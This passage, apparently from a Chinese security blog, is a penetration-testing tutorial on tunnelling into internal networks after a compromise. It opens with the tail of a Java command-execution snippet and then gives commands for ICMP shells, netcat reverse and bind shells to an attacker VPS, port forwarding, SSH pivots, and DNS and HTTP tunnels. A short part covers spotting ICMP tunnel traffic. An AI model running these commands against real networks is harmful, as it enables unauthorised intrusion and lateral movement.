class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">int</span>                   a    = -<span class="hljs-number">1</span>;<br><br>            <span class="hljs-comment">// 读取命令执行结果</span><br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                baos.write(b, <span class="hljs-number">0</span>, a);<br>            &#125;<br><br>            <span class="hljs-comment">// 输出命令执行结果</span><br>            System.out.println(baos.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译为jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CMD</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Process <span class="hljs-title">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">return</span> Runtime.getRuntime().exec(cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>构建通道漫游内网</title>
    <link href="/2022/02/19/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93%E6%BC%AB%E6%B8%B8%E5%86%85%E7%BD%91/"/>
    <url>/2022/02/19/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93%E6%BC%AB%E6%B8%B8%E5%86%85%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="构建通道漫游内网"><a href="#构建通道漫游内网" class="headerlink" title="构建通道漫游内网"></a>构建通道漫游内网</h1><h2 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h2><p>测试机器能否上网</p><ul><li>ICMP</li></ul><p><code>ping baidu.com</code></p><ul><li>HTTP</li></ul><p><code>curl baidu.com</code></p><ul><li>DNS</li></ul><p><code>nslookup baidu.com 114.114.114.114</code> //指定dns解析域名</p><p><code>dig @8.8.8.8 baidu.com</code></p><p>仅DNS出网可以直接CS-DNS上线</p><ul><li>TCP</li></ul><p><code>nc</code></p><blockquote><p>nc -lvvp 2333</p><p>nc -zv ip port //扫描时不发送任何数据，用于扫描</p><p>nc -nv ip port //不加n参数一样，会构建TCP/UDP连接读写数据</p></blockquote><ul><li>proxy</li></ul><p>流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段</p><p>判断：</p><ol><li>查看网络连接 netstat</li><li>查看内网是否有主机名类似于<code>proxy</code>的机器</li><li>本地一些软件的代理设置</li><li>pac文件</li><li>通过curl命令确认</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl baidu.com <span class="hljs-regexp">//</span>不通<br>curl -x proxy_ip baidu.com <span class="hljs-regexp">//</span>通<br>proxychains<br></code></pre></td></tr></table></figure><ul><li>读取本机代理</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG QUERY <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><span class="hljs-comment">#查看代理配置情况,连接它的代理试试</span><br></code></pre></td></tr></table></figure><ul><li>是否存在Nginx反向代理</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1、找到Nginx目录</span><br><span class="hljs-comment">#2、查看配置文件</span><br><span class="hljs-comment">#3、例如某次实战中发现正反向都代理不出去，查看配置文件发现了nginx反代，直接连接公网IP代理的3389端口</span><br></code></pre></td></tr></table></figure><h2 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h2><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><h4 id="ipv6"><a href="#ipv6" class="headerlink" title="ipv6"></a>ipv6</h4><p>socat、6tunnel、nt6tunnel</p><h4 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h4><p><img src="https://img-blog.csdnimg.cn/20201203132129490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" alt="img"></p><p>ICMP协议用于检测网络连通状态，不依赖于端口开放，而防火墙通常会开放此协议。于是在上层隧道http，dns等均不可建立时，可以ping远程访问计算机，尝试建立icmp隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿透防火墙</p><h5 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a><a href="https://github.com/inquisb/icmpsh">icmpsh</a></h5><p>跨平台，运行无需管理员权限，但会报毒</p><blockquote><p>icmpsh需要代替系统ping的应答程序，需要关闭系统的，保证shell的稳定</p><p>sysctl -w net.ipv4.icmp_echo_ignore_all=1</p></blockquote><p>可能存在的安装问题：以kali为例</p><p>运行：</p><blockquote><p>./run.sh</p></blockquote><p>提示安装impacket库，这里是python2运行的，因此需要pip2去安装</p><blockquote><p>安装pip2</p><p>wget <a href="https://bootstrap.pypa.io/pip/2.7/get-pip.py">https://bootstrap.pypa.io/pip/2.7/get-pip.py</a></p></blockquote><p>安装pip2后安装库可能出现报错<code>egg_info</code>，则需要更新<code>setuptools</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220228225530950.png"></p><p>这边运行./run.sh会报错，查看sh发现是</p><blockquote><p>python icmpsh_m.py “$IP” “VICTIM”</p></blockquote><p>于是kali</p><blockquote><p>python icmpsh_m.py 192.168.254.128 192.168.254.133</p></blockquote><p>目标</p><blockquote><p>icmpsh.exe -t 192.168.254.128</p><p>icmpsh.exe -t 192.168.254.128 -d 500 -b 30 -s 128 //500请求延迟(心跳)，断开shell前的最大数30，缓冲区数128</p></blockquote><p>具体参数：</p><blockquote><p>icmpsh.exe [options] -t target<br>options:<br>  -t host            host ip address to send ping requests to<br>  -r                 send a single test icmp request and then quit<br>  -d milliseconds    delay between requests in milliseconds (default is 200)<br>  -o milliseconds    timeout in milliseconds<br>  -h                 this screen<br>  -b num             maximal number of blanks (unanswered icmp requests) before quitting<br>  -s bytes           maximal data buffer size in bytes (default is 64 bytes)</p><p>In order to improve the speed, lower the delay (-d) between requests or increase the size (-s) of the data buffer</p></blockquote><p>如果环境中无python环境，则可以利用源码编译可执行文件</p><blockquote><p>gcc icmpsh-m.c -o icmpsh</p><p>./icmpsh 192.168.254.128 192.168.254.133</p></blockquote><p>icmp隧道分析<a href="https://zhuanlan.zhihu.com/p/113692119">https://zhuanlan.zhihu.com/p/113692119</a></p><p>普通的ping请求：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301144255789.png"></p><p>4个带有32字节数据的数据包</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">0000  <span class="hljs-number"> 48 </span>7d 2e f5 f2<span class="hljs-number"> 53 </span>34 7d f6 7b 2d<span class="hljs-number"> 11 </span>08<span class="hljs-number"> 00 </span>45<span class="hljs-number"> 00 </span>  H&#125;...S4&#125;.&#123;-...E.<br>0010  <span class="hljs-number"> 00 </span>3c 0a<span class="hljs-number"> 23 </span>00<span class="hljs-number"> 00 </span>80<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>c0 a8<span class="hljs-number"> 01 </span>68<span class="hljs-number"> 31 </span>e9   .&lt;.<span class="hljs-comment">#.........h1.</span><br>0020  <span class="hljs-number"> 22 </span>43<span class="hljs-number"> 08 </span>00<span class="hljs-number"> 31 </span>19<span class="hljs-number"> 00 </span>01 1c<span class="hljs-number"> 42 </span>61<span class="hljs-number"> 62 </span>63<span class="hljs-number"> 64 </span>65<span class="hljs-number"> 66 </span>  &quot;C..1....Babcdef<br>0030  <span class="hljs-number"> 67 </span>68<span class="hljs-number"> 69 </span>6a 6b 6c 6d 6e 6f<span class="hljs-number"> 70 </span>71<span class="hljs-number"> 72 </span>73<span class="hljs-number"> 74 </span>75<span class="hljs-number"> 76 </span>  ghijklmnopqrstuv<br>0040  <span class="hljs-number"> 77 </span>61<span class="hljs-number"> 62 </span>63<span class="hljs-number"> 64 </span>65<span class="hljs-number"> 66 </span>67<span class="hljs-number"> 68 </span>69                     wabcdefghi<br></code></pre></td></tr></table></figure><p>icmp隧道搭建的shell执行了命令则会产出大量流量，主要包含icmp请求和回复</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301145815977.png"></p><p>重点可以看一下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301150845044.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301150608667.png"></p><p>获取到shell以及执行了whoami命令产生的数据包高达106字节，因此在溯源时可以从：</p><ul><li>单位时间的icmp数据包数量</li><li>数据包大小</li><li>数据包内容</li></ul><h5 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a><a href="https://github.com/jamesbarlow/icmptunnel">icmptunnel</a></h5><h5 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a><a href="https://github.com/esrrhs/pingtunnel/releases">PingTunnel</a></h5><h5 id="powershell-icmp"><a href="#powershell-icmp" class="headerlink" title="powershell icmp"></a>powershell icmp</h5><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><h5 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h5><p>win  lcx.exe</p><p>linux lcx/portmap</p><ul><li>内网端口转发</li></ul><p>在目标机器上执行，将目标机器的指定端口(22)转发到公网 vps 指定端口上(80)</p><blockquote><p>./lcx -slave vps port 127.0.0.1 22</p></blockquote><p>在公网机器上监听80并转发到本机443端口上</p><blockquote><p>lcx.exe -listen 80 443<br>./portmap -m 2 -p1 80 -p2 443</p></blockquote><p>此时，攻击者用 ssh  公网IP+443 即可登陆目标服务器22</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/lcx.gif"></p><p>lcx时间比较长了，找不到来源，可以参考<a href="https://github.com/yw9381/lcx">https://github.com/yw9381/lcx</a></p><ul><li>本地端口映射，不直接访问22，但可以访问80(常用于绕过防火墙)</li></ul><blockquote><p>lcx -tran 80 127.0.0.1 22</p></blockquote><p>//备注：buu linux靶机修改其web服务端口为8080(外网不可直接访问)，然后做一个端口映射</p><blockquote><p> vim /etc/apache2/ports.conf</p><p>service apache2 restart</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/lcx2.gif"></p><h5 id="iptables-linux"><a href="#iptables-linux" class="headerlink" title="iptables(linux)"></a>iptables(linux)</h5><p>1、编辑配置文件</p><blockquote><p>vi /etc/sysctl.conf<br>net.ipv4.ip_forward = 1 #开启IP转发</p></blockquote><p>2、关闭服务</p><blockquote><p>service iptables stop</p></blockquote><p>3、配置规则</p><blockquote><p>#需要访问的内网地址：10.1.1.11（Windows）<br>#内网边界web服务器：192.168.100.100（Linux）<br>iptables -t nat -A PREROUTING –dst 192.168.100.100 -p tcp –dport 3389 -j DNAT–to-destination 10.1.1.11:3389</p><p>iptables -t nat -A POSTROUTING –dst 10.1.1.11 -p tcp –dport 3389 -j SNAT –to-source 192.168.100.100</p></blockquote><p>4、保存并重启服务</p><blockquote><p> service iptables save &amp;&amp; service iptables start</p></blockquote><p>这时访问Web服务器的3389就能登录到内网机器的桌面了。</p><h5 id="netsh-win"><a href="#netsh-win" class="headerlink" title="netsh(win)"></a>netsh(win)</h5><p>仅支持TCP协议，适用于<strong>双网卡</strong>服务器</p><blockquote><p>netsh interface portproxy show all //查看现有规则</p><p>netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=1234 connectaddress=内网IP connectport=3389 //添加转发规则，set改delete取消转发</p><p>netsh interface ipv6 install //xp下安装ipv6</p></blockquote><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"> nc -h<br>[v1.11 NT www.vulnwatch.org/netcat/]<br>connect to somewhere:   nc [-options] hostname port[s] [ports] ...<br>listen for inbound:     nc -l -p port [options] [hostname] [port]<br>options:<br>        -d              detach from console, background mode<br>        -e prog         inbound program to exec [dangerous!!]<br>        -g gateway      source-routing hop point[s], up to 8<br>        -G num          source-routing pointer: 4, 8, 12, ...<br>        -h              this cruft<br>        -i secs         delay interval for lines sent, ports scanned<br>        -l              listen mode, for inbound connects<br>        -L              listen harder, re-listen on socket close<br>        -n              numeric-only IP addresses, no DNS<br>        -o file         hex dump of traffic<br>        -p port         local port number<br>        -r              randomize local and remote ports<br>        -s addr         local source address<br>        -t              answer TELNET negotiation<br>        -u              UDP mode<br>        -v              verbose [use twice to be more verbose]<br>        -w secs         timeout for connects and final net reads<br>        -z              zero-I/O mode [used for scanning]<br>port numbers can be individual or ranges: m-n [inclusive]<br></code></pre></td></tr></table></figure><p>来，英语不好的达瓦里氏，给你们翻译翻译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -l -p port [options] [hostname] [port]<br><br>-d 后台模式<br>-e prog 程序重定向，一旦连接，就执行 [危险!!]<br>-g &lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个<br>-G &lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数<br>-h 帮助信息<br>-i secs 延时的间隔<br>-l 监听模式，用于入站连接<br>-L 连接关闭后,仍然继续监听<br>-n 指定数字的IP地址，不能用hostname<br>-o file 记录16进制的传输<br>-p port 本地端口号<br>-r 随机本地及远程端口<br>-s addr 本地源地址<br>-t 使用TELNET交互方式<br>-u UDP模式<br>-v 详细输出--用两个-v可得到更详细的内容<br>-w secs timeout的时间<br>-z 将输入输出关掉--用于扫描时<br><br>端口的表示方法可写为M-N的范围格式<br></code></pre></td></tr></table></figure><p><code>反向连接</code>：目标绑定shell并发起连接，vps监听</p><blockquote><p>vps：nc -lvvp 2333</p><p>target：nc -t -e cmd RemoteIP 2333 //cmd重定向到目标ip，即弹shell，也可以用powershell</p></blockquote><p><code>正向连接</code>：目标绑定shell并监听等待连接，vps发起连接</p><p><strong>情形往往是目标不出网</strong></p><blockquote><p>target：nc -lvvp 2333 -e cmd</p><p>nc -nvv targetIP 2333</p></blockquote><p>大白话就是：不管怎样，都是先监听后建立连接，区别在于谁在监听</p><h5 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h5><p>nc的powershell版本<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><h5 id="Tunna"><a href="#Tunna" class="headerlink" title="Tunna"></a><a href="https://github.com/SECFORCE/Tunna">Tunna</a></h5><p>有点像reGeorg的方式，但这是通过HTTP包装的TCP隧道工具，同样需要上传脚本</p><p>然后攻击机器：</p><blockquote><p>python proxy.py -u <a href="http://xxx/conn.php">http://xxx/conn.php</a> -l 4444 -r 3389 -v</p></blockquote><p>现在即可通过本地4444访问到远端3389</p><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><h5 id="udp2raw"><a href="#udp2raw" class="headerlink" title="udp2raw"></a><a href="https://github.com/wangyu-/udp2raw">udp2raw</a></h5><h4 id="KCP"><a href="#KCP" class="headerlink" title="KCP"></a>KCP</h4><p><a href="https://zhuanlan.zhihu.com/p/112442341">kcp</a>TCP和UDP的折中方案</p><h5 id="Dog-Tunnel"><a href="#Dog-Tunnel" class="headerlink" title="Dog Tunnel"></a><a href="https://github.com/vzex/dog-tunnel">Dog Tunnel</a></h5><p>又名狗洞，使用方法</p><p><a href="https://hatboy.github.io/2018/08/28/%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%8F%8A%E7%A9%BF%E9%80%8F/2.png"><img src="https://inotgo.com/imagesLocal/202111/08/20211108204253211w_0.png.jpg"></a></p><ul><li><p>dtunnel_s 为服务端 dtunnel 为客户端。远端是最终要连接的端口，通常是内网服务器，近端是本地需要连接的端口，通常是本地。</p></li><li><p>dtunnel_s  启动时会监听一个tcp端口，通过-addr设置，如果需要-ssl(默认是false)，那么要指定-cert加载ssl证书，之后客户端连接也要打开-ssl开关(默认是true的) -addrudp 是p2p打洞的辅助udp端口，能提高打洞成功率,对应dtunnel参数-buster指定同样的ip和端口</p></li><li><p>dtunnel_s 支持远程接口管理，如果需要，可通过-admin 指定ip:端口，比如-admin 127.0.0.1:1234</p></li><li><p>使用方法：</p><ol><li>首先在公网服务器上面启动服务，监听端口：</li></ol><blockquote><p>dtunnel_s -addr 0.0.0.0:8888 -ssl=false</p></blockquote></li><li><p>服务端参数说明：</p><ul><li>-addr：服务端地址，默认是：0.0.0.0:8000</li><li>-addrudp：UDP服务端地址，用于P2P辅助打洞，默认是：0.0.0.0:8018</li><li>-admin：管理接口，用于提供API方便管理，如：0.0.0.0:1234</li><li>-ssl：启用ssl支持，启用需要指定-cert和-cert参数，默认关闭，有bug，必须加上-ssl=false来关闭ssl</li><li>-https：启用管理接口的HTTPS支持，需要指定-cert和-cert参数，默认关闭</li><li>-cert：证书路径</li><li>-key：证书密钥路径</li><li>-dbhost：数据库服务器</li><li>-dbpass：数据库密码</li><li>-dbuser：数据库用户</li><li>-replace：如果客户端注册名冲突，踢掉之前的，默认关闭</li><li>-version：显示版本</li></ul><ol start="2"><li>远端客户端连接服务端：</li></ol><blockquote><p>dtunnel -buster 1.2.3.4:8018 -remote 1.2.3.4:8888 -mode 0 -reg redis -local :6379 -addip 127.0.0.1 -clientkey password -ssl=false</p><p>如果需要开启SOCKS5服务，修改-local参数即可，近端无需修改</p><p>dtunnel -buster 1.2.3.4:8018 -remote 1.2.3.4:8888 -mode 0 -reg redis -local socks5 -addip 127.0.0.1 -clientkey password -ssl=false</p></blockquote><ol start="3"><li>近端客户端连接客户端：</li></ol><blockquote><p>dtunnel -buster 1.2.3.4:8018 -remote 1.2.3.4:8888 -mode 0 -link redis -local :9999 -addip 127.0.0.1 -clientkey password -ssl=false -encrypt</p></blockquote></li><li><p>客户端参数说明：</p><ul><li><p>-addip：出口IP(单个或列表)，注意:对于多公网ip的终端，请用-stun参数指定stun服务器辅助连接，或者用-addip参数手工指定出口ip列表，默认是：127.0.0.1</p></li><li><p>-remote：远程服务器，用于C/S模式，对应服务端-addr地址端口</p></li><li><p>-buster：打洞服务器，用于P2P模式，对应服务端-addrudp端口地址</p></li><li><p>-clientkey：客户端Key，用于远端和近端认证，需一致</p></li><li><p>-reg：注册名，远端使用</p></li><li><p>-link：连接的注册名，近端使用，用于识别连接远端</p></li><li><p>-local：本地监听端口，填socks5则为socks5代理服务</p></li><li><p>-encrypt：P2P模式加密，近端才能使用</p></li><li><p>-mode：连接模式(0:P2P打洞失败后切换为C/S 1:只使用P2P 2:只使用C/S)</p></li><li><p>-compress：压缩数据，远端和近端需一致</p></li><li><p>-debug：调试模式</p></li><li><p>-delay：打洞失败后重试延迟，秒</p></li><li><p>-dnscache：DNS缓存有效期，如果大于0将定时清空DNS缓存，分钟</p></li><li><p>-f：从文件中加载配置</p></li><li><p>-kcp：kcp配置，远端和近端需一致</p></li><li><p>-key：访问Key(服务端数据库中的AuthKey)</p></li><li><p>-pipen：管道数</p></li><li><p>ds：数据纠错？仅在P2P模式有效，远端和近端需一致</p></li><li><p>-ps：奇偶校验？仅在P2P模式有效，远端和近端需一致</p></li><li><p>-ssl：启用ssl支持，默认启用，服务端没有启用的话请使用-ssl=false来关闭，有bug，必须加上-ssl=false来关闭ssl</p></li><li><p>-v：输出详细日志</p></li><li><p>-version：显示版本</p></li></ul><ol start="4"><li>访问：访问近端（本地）9999端口即可连接到远端6379端口。或者通过本地9999端口连接SOCKS5服务器： </li></ol><blockquote><p>nc 127.0.0.1 9999</p><p>或者</p><p>curl ip.cn -x socks5://127.0.0.1:9999</p></blockquote></li></ul><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>应用层位于TCP/IP协议的最顶层，通常用于搭建各种应用服务，而基于应用层搭建的隧道技术就是利用各种应用所占用的端口进行搭建，比如有SSH、HTTP/HTTPS和DNS服务，这些服务是服务器经常用到不会被禁止的协议。</p><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>SSH是英文Secure Shell的简写形式,SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登陆会话和其他网络服务提供安全性的协议。ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全认证方式也是有其弱点的， 就是很容易受到“中间人”攻击，SSH目前包括 SSH1和SSH2两个版本，是目前最常用的安全通讯协议。通常情况下，ssh协议是允许通过防火墙和边界设备。</p><p>尤其是取得高权限shell时屡试不爽</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh<br>usage: ssh [?] [-b bind_address] [-c cipher_spec]<br>           [-D [bind_address:]port] [-E log_file] [-e escape_char]<br>           [-F configfile] [-I pkcs11] [-i identity_file]<br>           [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec]<br>           [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]<br>           [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]<br>           [user@]hostname [command]<br>//-f:后台认证用户/密码，通常和-N连用，不用登录到远程主机;-N:不执行脚本或命令，通常与-f连用<br>//-C:压缩传输数据;-g:允许远程主机连接本机的转发端口...还有其他说法的...<br></code></pre></td></tr></table></figure><h5 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h5><p>A是攻击者，B和C在一个内网，A可以访问B(B具有公网IP)，但不可以访问C</p><p><strong>A上执行：</strong></p><blockquote><p>ssh -CfNg -L A监听端口 : C内网IP : 目标端口  root@B          -f转入后台 -N建立静默连接，两参数常配合使用</p></blockquote><blockquote><p> ssh -CfNg -L 1234:192.168.254.155:3389 <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#50;&#53;&#52;&#x2e;&#x31;&#x33;&#x30;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#50;&#53;&#52;&#x2e;&#x31;&#x33;&#x30;</a></p></blockquote><p>可能会一时难以理解，在本地(ssh.exe所在机器)监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口，ssh本地转发也是正向的。</p><p>A-128，B-130，C-155</p><p>假如b=c，则是本地转发的特例，端口转发</p><h5 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h5><p>A是攻击者的VPS，攻陷B，B和C同一内网没有公网IP</p><p><strong>跳板B上执行：</strong></p><blockquote><p>ssh -CfNg -R A端口 :  C内网IP : C目标端口 root@A</p></blockquote><blockquote><p>ssh -CfNg -R 10086:192.168.254.155:3389 <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x32;&#53;&#x34;&#46;&#x31;&#x32;&#x38;">&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x32;&#53;&#x34;&#46;&#x31;&#x32;&#x38;</a></p></blockquote><p>然后在VPS上就可以访问C3389，这是反向的</p><p>假如b=c，则是内网穿透的反向代理</p><p>理解不清楚的参考：<a href="https://zhuanlan.zhihu.com/p/170597122">https://zhuanlan.zhihu.com/p/170597122</a></p><h5 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h5><p>你的Linux A，以及一台海外服务器B，ssh动态转发建立socks4/5后可用于翻墙</p><blockquote><p>ssh -qTfnN -D 端口 root@B </p></blockquote><p>然后使用proxychains使用该socks隧道即可</p><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>首先查看内部域名及ip地址</p><blockquote><p>cat /etc/resolv.conf | grep -v “#”</p></blockquote><p>查看是否与内部DNS通信解析外部域名</p><blockquote><p>nslookup baidu.com</p></blockquote><p>可以参考文章搭建：</p><p><a href="https://www.secpulse.com/archives/144987.html">https://www.secpulse.com/archives/144987.html</a></p><p>工具推荐：</p><p>dnscat2(win可以用dnscat2-powershell)、iodine</p><ul><li>部署域名解析</li></ul><p>先添加A类解析，然后创建NS解析</p><p>主机记录：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531212729475.png"></p><p>解析类型：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531212853728.png"></p><ul><li>联通测试，VPS抓包</li></ul><blockquote><p>tcpdump -n -i eth0 udp port 53</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220528202309017.png"></p><h5 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a><a href="https://github.com/yarrick/iodine">iodine</a></h5><p>服务端如上检查NS解析正常后：</p><blockquote><p>iodined -fP password 10.0.0.1 ns1.xxx.xxx //服务器会生成一个10.0.0.1的dns0接口</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531221801850.png"></p><p>客户端：</p><blockquote><p>iodine -fP password [vps-ip] ns1.xxx.xxx //不能访问外网ip时，可以不加vps-ip</p></blockquote><p>如果出现报错</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531213841946.png"></p><p>服务端加上<code>-c</code>参数<code>to disable check of client IP/port on each request</code></p><p>然后查看目标机器生成的dns0接口</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531221921570.png"></p><p>在vps使用：</p><blockquote><p>ssh <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x30;&#46;&#48;&#46;&#48;&#x2e;&#50;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x30;&#46;&#48;&#46;&#48;&#x2e;&#50;</a></p></blockquote><p>一些比较糟糕的情况(中继模式)，使用<code>-I1</code>、<code>-L0</code>、<code>-m</code>、<code>-M 200</code>等选项</p><h4 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP/HTTPS"></a>HTTP/HTTPS</h4><h5 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a><a href="https://github.com/sensepost/reGeorg">reGeorg</a></h5><p>reGeorg 是 reDuh 的升级版，主要功能是把内网服务器端口的数据通过 HTTP/HTTPS 隧道转发到本机，实现基于 HTTP 协议的通信。 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 reGeorgSocksProxy.py -h<br><br>usage: reGeorgSocksProxy.py [-h] [-l] [-p] [-r] -u  [-v]                      <br>                                                                              <br>Socks server for reGeorg HTTP(s) tunneller                                    <br>                                                                              <br>optional arguments:                                                           <br>  -h, --help           show this help message and exit                        <br>  -l , --listen-on     The default listening address                          <br>  -p , --listen-port   The default listening port                             <br>  -r , --read-buff     Local read buffer, max data to be sent per POST        <br>  -u , --url           The url containing the tunnel script                   <br>  -v , 